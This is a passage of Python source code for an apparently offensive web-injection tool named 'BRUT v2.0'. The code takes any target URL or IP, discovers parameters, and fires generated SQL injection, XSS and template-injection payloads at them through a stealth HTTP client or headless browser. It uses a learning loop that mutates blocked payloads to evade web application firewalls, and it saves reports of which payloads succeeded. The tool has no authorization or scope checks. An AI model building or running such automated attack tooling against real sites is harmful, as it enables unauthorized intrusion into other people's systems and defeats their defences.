            return "[empty]"
        # Clean HTML tags for snippet
        clean = re.sub(r'<[^>]+>', ' ', text)
        clean = re.sub(r'\s+', ' ', clean).strip()
        if pos > 0 and pos < len(clean):
            start = max(0, pos - 20)
            end = min(len(clean), pos + 60)
            return clean[start:end].strip()
        return clean[:80] if clean else "[empty]"


# ============================================================
# INJECTOR
# ============================================================
class Injector:
    def __init__(self, target: str):
        self.target = target
        self.client = get_stealth_client()
        self.analyzer = ResponseAnalyzer()
        self.browser = None

    def _init_browser(self):
        if self.browser or not HAS_PLAYWRIGHT:
            return
        try:
            self._pw = sync_playwright().start()
            self.browser = self._pw.chromium.launch(headless=True)
        except Exception as e:
            self.browser = None

    def _close_browser(self):
        if self.browser:
            try:
                self.browser.close()
                self._pw.stop()
            except:
                pass

    def inject(self, param: Parameter, payload_dict: Dict,
               use_browser: bool = False) -> Optional[InjectionResult]:
        payload = payload_dict["payload"]
        try:
            start_time = time.time()
            if use_browser and param.location == "form_input":
                response_text, status, resp_time, resp_size = self._inject_browser(param, payload)
            else:
                response_text, status, resp_time, resp_size = self._inject_http(param, payload)

            elapsed_ms = resp_time if resp_time > 0 else (time.time() - start_time) * 1000

            resp_type, evidence, success, snippet = self.analyzer.analyze(
                response_text, status, elapsed_ms
            )

            return InjectionResult(
                payload_id=payload_dict["id"],
                payload=payload,
                category=payload_dict["category"],
                parameter=param.name,
                url=param.url,
                method=param.method,
                status_code=status,
                response_time_ms=elapsed_ms,
                response_size=resp_size,
                response_type=resp_type,
                evidence=evidence,
                response_snippet=snippet,
                success=success,
                timestamp=datetime.now().isoformat(),
            )

        except Exception as e:
            return InjectionResult(
                payload_id=payload_dict["id"],
                payload=payload,
                category=payload_dict["category"],
                parameter=param.name,
                url=param.url,
                method=param.method,
                status_code=0,
                response_time_ms=0,
                response_size=0,
                response_type="blocked",
                evidence=f"Error: {str(e)[:80]}",
                response_snippet="[connection failed]",
                success=False,
                timestamp=datetime.now().isoformat(),
            )

    def _inject_http(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
        start = time.time()
        response_text = ""
        status = 0
        resp_size = 0
        try:
            if self.client:
                if param.method == "GET":
                    resp = self.client.get(param.url, params={param.name: payload}, timeout=20)
                else:
                    resp = self.client.post(param.url, data={param.name: payload}, timeout=20)
                response_text = resp.text
                status = resp.status_code
                resp_size = len(resp.content)
            elif HAS_REQUESTS:
                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
                if param.method == "GET":
                    resp = requests.get(param.url, params={param.name: payload},
                                       headers=headers, timeout=20, verify=False)
                else:
                    resp = requests.post(param.url, data={param.name: payload},
                                        headers=headers, timeout=20, verify=False)
                response_text = resp.text
                status = resp.status_code
                resp_size = len(resp.content)
            resp_time = (time.time() - start) * 1000
            return response_text, status, resp_time, resp_size
        except Exception:
            resp_time = (time.time() - start) * 1000
            return "", 0, resp_time, 0

    def _inject_browser(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
        if not self.browser:
            self._init_browser()
        if not self.browser:
            return self._inject_http(param, payload)
        start = time.time()
        try:
            page = self.browser.new_page()
            page.goto(param.url, timeout=15000)
            time.sleep(1)
            selectors = [f'input[name="{param.name}"]', f'textarea[name="{param.name}"]',
                        f'select[name="{param.name}"]', f'#{param.name}']
            filled = False
            for sel in selectors:
                try:
                    elem = page.query_selector(sel)
                    if elem:
                        elem.fill(payload)
                        filled = True
                        break
                except:
                    continue
            if filled:
                try:
                    page.click('button[type="submit"], input[type="submit"]')
                    page.wait_for_load_state("networkidle", timeout=5000)
                except:
                    pass
            time.sleep(1)
            response_text = page.content()
            resp_size = len(response_text)
            resp_time = (time.time() - start) * 1000
            page.close()
            return response_text, 200, resp_time, resp_size
        except Exception:
            resp_time = (time.time() - start) * 1000
            return "", 0, resp_time, 0

    def close(self):
        self._close_browser()


# ============================================================
# REPORT SAVER
# ============================================================
class ReportSaver:
    def __init__(self, target: str, output_dir: str = "./brut_results"):
        self.target = target
        self.parsed = urlparse(target)
        self.domain = self.parsed.netloc or self.parsed.path
        self.domain_clean = re.sub(r'[^a-zA-Z0-9.-]', '_', self.domain)
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def save(self, results: List[InjectionResult], payloads: List[Dict],
             learner: FeedbackLearner = None) -> Tuple[str, str]:
        now = datetime.now()
        year = now.strftime("%Y")
        month = now.strftime("%m")
        day = now.strftime("%d")

        folder_name = f"list-payload-for-{self.domain_clean}-{year}"
        folder_path = os.path.join(self.output_dir, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        base_name = f"{month}_{day}"
        txt_path = os.path.join(folder_path, f"{base_name}.txt")
        json_path = os.path.join(folder_path, f"{base_name}.json")

        server_response = [r for r in results if r.response_type == "server_output"]
        raw_html = [r for r in results if r.response_type == "raw_html"]
        blocked = [r for r in results if r.response_type == "blocked"]

        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("=" * 80 + "\n")
            f.write(f"  BRUT v2.0 PAYLOAD INJECTION REPORT\n")
            f.write(f"  Target    : {self.target}\n")
            f.write(f"  Domain    : {self.domain}\n")
            f.write(f"  Date      : {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Total     : {len(results)} payloads tested\n")
            if learner:
                f.write(f"  ML Learn  : {learner.get_learning_summary()}\n")
            f.write("=" * 80 + "\n\n")

            f.write("=" * 80 + "\n")
            f.write(f"[✓] PAYLOAD BERHASIL (Server Output, Bukan Raw HTML)\n")
            f.write(f"    Jumlah: {len(server_response)}\n")
            f.write("=" * 80 + "\n\n")
            for i, r in enumerate(server_response, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  URL       : {r.url}\n")
                f.write(f"  Method    : {r.method}\n")
                f.write(f"  Status    : {r.status_code} ({get_status_meaning(r.status_code)})\n")
                f.write(f"  Time      : {r.response_time_ms:.0f}ms\n")
                f.write(f"  Evidence  : {r.evidence}\n")
                f.write(f"  Snippet   : {r.response_snippet}\n")
                f.write(f"  Payload   : {r.payload[:300]}\n")
                f.write("\n")

            f.write("\n" + "=" * 80 + "\n")
            f.write(f"[~] PAYLOAD RESPON RAW HTML\n")
            f.write(f"    Jumlah: {len(raw_html)}\n")
            f.write("=" * 80 + "\n\n")
            for i, r in enumerate(raw_html, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  Status    : {r.status_code}\n")
                f.write(f"  Payload   : {r.payload[:200]}\n\n")

            f.write("\n" + "=" * 80 + "\n")
            f.write(f"[✗] PAYLOAD DIBLOKIR\n")
            f.write(f"    Jumlah: {len(blocked)}\n")
            f.write("=" * 80 + "\n\n")
            for i, r in enumerate(blocked, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  Status    : {r.status_code}\n")
                f.write(f"  Evidence  : {r.evidence}\n")
                f.write(f"  Payload   : {r.payload[:200]}\n\n")

            f.write("\n" + "=" * 80 + "\nEND OF REPORT\n" + "=" * 80 + "\n")

        json_data = {
            "meta": {
                "target": self.target, "domain": self.domain,
                "timestamp": now.isoformat(),
                "total_payloads": len(results),
                "server_response_count": len(server_response),
                "raw_html_count": len(raw_html),
                "blocked_count": len(blocked),
                "ml_learning": learner.get_learning_summary() if learner else "",
            },
            "server_response": [r.to_dict() for r in server_response],
            "raw_html": [r.to_dict() for r in raw_html],
            "blocked": [r.to_dict() for r in blocked],
            "all_payloads": payloads,
        }
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)

        return txt_path, json_path


# ============================================================
# DETAILED LOGGER — shows payload, response, status, time
# ============================================================
class DetailedLogger:
    """Enhanced logging for each injection attempt."""

    @staticmethod
    def log_result(index: int, total: int, result: InjectionResult):
        """Log satu injection result dengan detail."""
        # Symbol based on response type
        if result.success:
            symbol = "\033[1;32m[✓]\033[0m"
        elif result.response_type == "raw_html":
            symbol = "\033[37m[~]\033[0m"
        else:
            symbol = "\033[31m[✗]\033[0m"

        # Status code with meaning
        status_str = f"\033[33m{result.status_code}\033[0m"
        status_meaning = get_status_meaning(result.status_code)

        # Response time
        time_str = f"\033[36m{result.response_time_ms:.0f}ms\033[0m"

        # Response type label
        if result.response_type == "server_output":
            type_label = "\033[1;32mSERVER OUTPUT\033[0m"
        elif result.response_type == "raw_html":
            type_label = "\033[37mraw HTML\033[0m"
        else:
            type_label = "\033[31mBLOCKED\033[0m"

        # Truncate payload for display (max 80 chars)
        payload_display = result.payload[:80].replace('\n', '\\n').replace('\r', '\\r')
        if len(result.payload) > 80:
            payload_display += "..."

        # Truncate response snippet (max 60 chars)
        snippet = result.response_snippet[:60].replace('\n', ' ').replace('\r', '')

        # Main line
        print(f"  {symbol} \033[33m[{index}/{total}]\033[0m "
              f"\033[35m{result.category:<6}\033[0m → "
              f"\033[37m{result.parameter:<12}\033[0m | "
              f"{type_label} | "
              f"Status: {status_str} ({status_meaning[:25]}) | "
              f"⏱ {time_str}")

        # Payload line
        print(f"         \033[90mPayload : \033[0m{payload_display}")

        # Response snippet line
        if snippet:
            print(f"         \033[90mResponse: \033[0m{snippet}")

        # Extra line for spacing on success
        if result.success:
            print(f"         \033[1;32m⚡ Evidence: {result.evidence}\033[0m")
            print()


# ============================================================
# MAIN PIPELINE
# ============================================================
class BRUTPipeline:
    def __init__(self, target: str):
        self.target = target
        self.parameters: List[Parameter] = []
        self.payloads: List[Dict] = []
        self.results: List[InjectionResult] = []
        self.learner = FeedbackLearner()
        self.generator = MLPayloadGenerator(self.learner)
        self.injector = Injector(target)
        self.saver = ReportSaver(target)
        self.logger = DetailedLogger()

    def phase1_discover(self) -> List[Parameter]:
        discovery = ParameterDiscovery(self.target)
        self.parameters = discovery.run()
        return self.parameters

    def phase2_generate(self, count: int) -> List[Dict]:
        if count <= 0:
            return []
        self.payloads = self.generator.generate(count)
        return self.payloads

    def phase3_inject(self, max_mode: bool = False) -> List[InjectionResult]:
        self.results = []
        total = len(self.payloads) * len(self.parameters)
        tested = 0
        found_success = False

        print(f"\n\033[36m[*]\033[0m Starting injection: "
              f"{len(self.payloads)} payloads × {len(self.parameters)} parameters")
        print(f"    Total tests: {total}")
        print(f"    Mode: {'MAX (stop on first success)' if max_mode else 'NORMAL'}")
        print(f"    ML: Adaptive learning active\n")
        print(f"\033[33m{'─'*100}\033[0m")

        for param in self.parameters:
            if max_mode and found_success:
                break

            for payload_dict in self.payloads:
                tested += 1
                result = self.injector.inject(param, payload_dict)

                if result:
                    self.results.append(result)

                    # Feed back to ML learner
                    self.learner.record_feedback(payload_dict, result)

                    # Detailed logging for every attempt
                    self.logger.log_result(tested, total, result)

                    if result.success:
                        found_success = True
                        if max_mode:
                            break

                # Adaptive rate limiting
                if result and result.response_time_ms > 3000:
                    time.sleep(random.uniform(0.5, 1.0))
                else:
                    time.sleep(random.uniform(0.08, 0.25))

                # Periodic ML summary
                if tested % 50 == 0 and tested > 0:
                    ml_summary = self.learner.get_learning_summary()
                    if ml_summary != "Learning...":
                        print(f"\n  \033[1;36m[ML]\033[0m Learning: {ml_summary}")
                        print(f"  \033[1;36m[ML]\033[0m Weights updated: "
                              f"sqli={self.learner.category_weights.get('sqli', 0):.2f}, "
                              f"xss={self.learner.category_weights.get('xss', 0):.2f}, "
                              f"ssti={self.learner.category_weights.get('ssti', 0):.2f}\n")

        print(f"\033[33m{'─'*100}\033[0m")
        return self.results

    def phase3_advanced_retry(self) -> List[InjectionResult]:
        failed = [r for r in self.results if r.response_type in ["raw_html", "blocked"]]
        if not failed:
            return []

        print(f"\n\033[33m[*]\033[0m ML evolving: generating advanced variants from {len(failed)} failed attempts...")

        failed_dicts = [{"id": r.payload_id, "category": r.category, "payload": r.payload}
                        for r in failed]
        advanced_payloads = self.generator.generate_advanced_batch(failed_dicts)
        print(f"    Generated {len(advanced_payloads)} advanced variants\n")

        advanced_results = []
        total_adv = len(advanced_payloads) * len(self.parameters)
        tested = 0

        for param in self.parameters:
            for payload_dict in advanced_payloads:
                tested += 1
                result = self.injector.inject(param, payload_dict)
                if result:
                    advanced_results.append(result)
                    self.learner.record_feedback(payload_dict, result)
                    self.logger.log_result(tested, total_adv, result)

        self.results.extend(advanced_results)
        return advanced_results

    def phase4_save(self) -> Tuple[str, str]:
        return self.saver.save(self.results, self.payloads, self.learner)

    def print_summary(self):
        server = [r for r in self.results if r.response_type == "server_output"]
        raw = [r for r in self.results if r.response_type == "raw_html"]
        blocked = [r for r in self.results if r.response_type == "blocked"]

        print(f"\n\033[1;36m{'='*80}")
        print(f"  BRUT v2.0 INJECTION SUMMARY")
        print(f"{'='*80}\033[0m")
        print(f"  Total payloads tested  : {len(self.results)}")
        print(f"  \033[32m✓ Server output (SUCCESS)\033[0m : {len(server)}")
        print(f"  \033[37m~ Raw HTML response    \033[0m  : {len(raw)}")
        print(f"  \033[31m✗ Blocked/no response  \033[0m  : {len(blocked)}")

        print(f"\n  \033[1;35mML Learning Summary:\033[0m")
        print(f"    {self.learner.get_learning_summary()}")

        if self.learner.successful_patterns:
            print(f"\n  \033[1;32mSuccessful Patterns:\033[0m")
            for sp in self.learner.successful_patterns[:5]:
                print(f"    • [{sp['category']}] strategy={sp['strategy']} | {sp['evidence'][:50]}")

        if self.learner.blocked_patterns:
            print(f"\n  \033[1;31mBlocked Patterns (WAF):\033[0m")
            for bp in self.learner.blocked_patterns[:3]:
                print(f"    • [{bp['category']}] status={bp['status']} | {bp['payload_snippet'][:40]}")

        if server:
            print(f"\n  \033[1;32mTop Successful Payloads:\033[0m")
            for r in server[:5]:
                print(f"    ✓ [{r.payload_id}] {r.category} → {r.evidence[:60]}")


# ============================================================
# INTERACTIVE MAIN LOOP
# ============================================================
def interactive_main():
    print_banner()

    while True:
        print(f"\n\033[1;33m{'─'*60}\033[0m")
        print(f"  \033[1;37mTarget Input\033[0m  (link / domain / URL / IP)")
        print(f"  Ketik \033[31m/exit\033[0m untuk keluar")
        print(f"\033[1;33m{'─'*60}\033[0m")

        try:
            target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\n\033[31m[*]\033[0m Exiting...")
            break

        if not target:
            continue
        if target.lower() in ["/exit", "exit", "/quit", "quit"]:
            print(f"\n\033[31m[*]\033[0m Exiting BRUT v2.0. Goodbye!")
            break

        if not target.startswith(("http://", "https://")):
            target = "http://" + target

        parsed = urlparse(target)
        if not parsed.netloc:
            print(f"  \033[31m[!]\033[0m Target tidak valid: {target}")
            continue

        pipeline = BRUTPipeline(target)
        params = pipeline.phase1_discover()

        if not params:
            print(f"\n  \033[31m[!]\033[0m Tidak ada parameter ditemukan di {target}")
            continue

        print(f"\n\033[1;32m{'='*60}")
        print(f"  PARAMETER DISCOVERY RESULTS")
        print(f"{'='*60}\033[0m")
        print(f"  Total parameter ditemukan: \033[1;37m{len(params)}\033[0m\n")

        by_location = defaultdict(list)
        for p in params:
            by_location[p.location].append(p)
        for loc, p_list in by_location.items():
            print(f"  \033[36m[{loc.upper()}]\033[0m ({len(p_list)})")
            for p in p_list[:5]:
                print(f"    • \033[37m{p.name:<25}\033[0m [{p.method}] {p.url[:60]}")
            if len(p_list) > 5:
                print(f"    ... dan {len(p_list)-5} lainnya")
            print()

        try:
            confirm = input(f"  \033[1;33mLanjut ke tahap injection? [Y/N] >> \033[0m").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if confirm not in ["y", "yes", "ya", ""]:
            print(f"  \033[33m[*]\033[0m Dibatalkan.")
            continue

        print(f"\n\033[1;33m{'─'*60}\033[0m")
        print(f"  \033[1;37mJumlah Payload Variant\033[0m")
        print(f"  • Angka (contoh: 100, 1000, 5000)")
        print(f"  • \033[35mmax\033[0m = unlimited, berhenti saat temukan success")
        print(f"\033[1;33m{'─'*60}\033[0m")

        try:
            count_input = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> \033[0m").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        max_mode = False
        if count_input == "max":
            max_mode = True
            payload_count = 500
            print(f"  \033[35m[*]\033[0m MAX mode aktif — berhenti saat sukses")
        else:
            try:
                payload_count = int(count_input)
                if payload_count <= 0:
                    raise ValueError
            except ValueError:
                print(f"  \033[31m[!]\033[0m Input tidak valid, gunakan angka atau 'max'")
                continue

        print(f"\n\033[36m[*]\033[0m Generating {payload_count} payload variants dari nol...")
        payloads = pipeline.phase2_generate(payload_count)
        print(f"  \033[32m[+]\033[0m Generated {len(payloads)} unique payloads")

        by_cat = Counter(p["category"] for p in payloads)
        by_tier = Counter(p["length_tier"] for p in payloads)
        by_strat = Counter(p["strategy"] for p in payloads)
        print(f"  By category : {dict(by_cat)}")
        print(f"  By tier     : {dict(by_tier)}")
        print(f"  Strategies  : {len(by_strat)} unique")

        pipeline.phase3_inject(max_mode=max_mode)

        success_count = len([r for r in pipeline.results if r.response_type == "server_output"])
        if success_count == 0 and not max_mode:
            print(f"\n\033[33m[*]\033[0m No success yet — ML evolving payloads...")
            pipeline.phase3_advanced_retry()

        txt_path, json_path = pipeline.phase4_save()
        pipeline.print_summary()

        print(f"\n  \033[32m[+]\033[0m Report saved:")
        print(f"      TXT : {txt_path}")
        print(f"      JSON: {json_path}")

        pipeline.injector.close()


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    try:
        interactive_main()
    except KeyboardInterrupt:
        print(f"\n\n\033[31m[*]\033[0m Interrupted. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[31m[FATAL]\033[0m {e}")
        traceback.print_exc()
        sys.exit(1)
